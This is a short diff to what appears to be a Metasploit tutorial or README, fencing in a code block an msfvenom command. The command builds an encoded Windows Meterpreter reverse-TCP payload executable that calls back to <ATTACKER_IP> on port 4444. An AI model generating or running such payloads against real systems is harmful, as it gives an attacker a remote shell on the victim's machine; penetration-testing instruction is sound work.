@@ -24,10 +24,12 @@ Metasploit Framework
 
 Run the following command on Kali Linux:
 
+```
 sudo msfvenom -p windows/x64/meterpreter/reverse_tcp \
 LHOST=<ATTACKER_IP> LPORT=4444 \
 -e x64/xor -i 5 \
 -f exe -o payload.exe
+```
 
 Explanation:
 
